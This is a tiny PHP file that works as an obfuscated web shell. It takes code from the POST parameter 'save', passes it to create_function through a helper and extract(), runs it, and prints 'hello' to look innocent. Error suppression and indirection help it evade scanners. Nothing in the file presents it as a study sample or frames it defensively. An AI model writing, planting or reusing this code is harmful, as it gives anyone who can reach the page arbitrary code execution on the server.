<?php
function fun2(){
	$b=$_POST;
	return @($b[save]);
}
@extract(array(b=>create_function(NULL,fun2())));
@extract(array(c=>$b()));
?>hello
